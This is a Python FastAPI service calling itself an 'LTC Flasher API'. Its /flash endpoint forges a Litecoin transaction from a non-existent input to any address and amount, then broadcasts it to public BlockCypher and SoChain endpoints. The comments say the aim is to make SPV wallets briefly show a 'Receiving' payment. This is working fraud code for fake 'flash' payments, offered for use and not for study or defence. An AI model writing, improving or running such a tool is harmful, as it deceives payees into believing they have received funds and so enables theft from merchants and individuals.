from fastapi import FastAPI, Request
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import requests, json, hashlib, struct, base64
from binascii import hexlify, unhexlify

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

LTC_PUBKEY_HASH = b'\x30'
LTC_TESTNET_PUBKEY_HASH = b'\x6f'

def dsha256(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def encode_varint(n):
    if n < 0xfd:
        return bytes([n])
    elif n <= 0xffff:
        return b'\xfd' + struct.pack("<H", n)
    elif n <= 0xffffffff:
        return b'\xfe' + struct.pack("<I", n)
    else:
        return b'\xff' + struct.pack("<Q", n)

def base58_decode(addr):
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num = 0
    for c in addr:
        num = num * 58 + alphabet.index(c)
    result = num.to_bytes((num.bit_length() + 7) // 8, 'big')
    # Add leading zero bytes for each leading '1' in the address
    for c in addr:
        if c == '1':
            result = b'\x00' + result
        else:
            break
    return result

def make_tx(version, inputs, outputs, locktime=0):
    tx = struct.pack("<I", version)
    tx += encode_varint(len(inputs))
    for i in inputs:
        tx += unhexlify(i['txid'])[::-1]
        tx += struct.pack("<I", i['vout'])
        script = i['script'] if isinstance(i['script'], bytes) else unhexlify(i['script'])
        tx += encode_varint(len(script)) + script
        tx += struct.pack("<I", i['sequence'])
    tx += encode_varint(len(outputs))
    for o in outputs:
        tx += struct.pack("<q", int(o['value'] * 1e8))
        script = o['script'] if isinstance(o['script'], bytes) else unhexlify(o['script'])
        tx += encode_varint(len(script)) + script
    tx += struct.pack("<I", locktime)
    return tx

@app.post("/flash")
async def flash(request: Request):
    body = await request.json()
    addr = body.get("address")
    amt = float(body.get("amount", 0))
    
    if not addr or not addr.startswith('L'):
        return {"error": "Invalid LTC address"}
    
    # Decode address to get hash160
    addr_bytes = base58_decode(addr)
    # Verify checksum
    if len(addr_bytes) < 25:
        return {"error": "Invalid address length"}
    
    hash160 = addr_bytes[1:21]
    checksum = addr_bytes[21:25]
    verify = dsha256(LTC_PUBKEY_HASH + hash160)[:4]
    if checksum != verify:
        return {"error": "Checksum failed"}
    
    # P2PKH scriptPubKey
    script_pubkey = bytes([0x76, 0xa9, 0x14]) + hash160 + bytes([0x88, 0xac])
    
    # Fake input from non-existent tx
    fake_input = {
        "txid": "0" * 64,
        "vout": 0,
        "script": b'',
        "sequence": 0xffffffff
    }
    
    outputs = [{
        "value": amt,
        "script": hexlify(script_pubkey).decode()
    }]
    
    tx = make_tx(2, [fake_input], outputs)
    txid = hexlify(dsha256(tx)[::-1]).decode()
    hex_tx = hexlify(tx).decode()
    
    # Try to broadcast to public APIs
    # Some nodes may briefly accept invalid txs into mempool before validation
    results = []
    
    blockcypher_url = "https://api.blockcypher.com/v1/ltc/main/txs/push"
    try:
        r = requests.post(blockcypher_url, json={"tx": hex_tx}, timeout=10)
        results.append({"endpoint": "blockcypher", "status": r.status_code, "resp": r.text[:300]})
    except Exception as e:
        results.append({"endpoint": "blockcypher", "error": str(e)})
    
    # Also try sochain as fallback
    sochain_url = "https://sochain.com/api/v2/send_tx/LTC"
    try:
        r = requests.post(sochain_url, json={"tx_hex": hex_tx}, timeout=10)
        results.append({"endpoint": "sochain", "status": r.status_code, "resp": r.text[:300]})
    except Exception as e:
        results.append({"endpoint": "sochain", "error": str(e)})
    
    return {
        "txid": txid,
        "hex": hex_tx,
        "target": addr,
        "amount": amt,
        "broadcast_attempts": results,
        "note": "Fake tx with invalid inputs. May show 'Receiving' in SPV wallets briefly."
    }

@app.get("/")
async def root():
    return {"status": "LTC Flasher API active", "endpoints": ["/flash", "/"]}

# Mount static files LAST so API routes take precedence
app.mount("/", StaticFiles(directory="public", html=True), name="static")
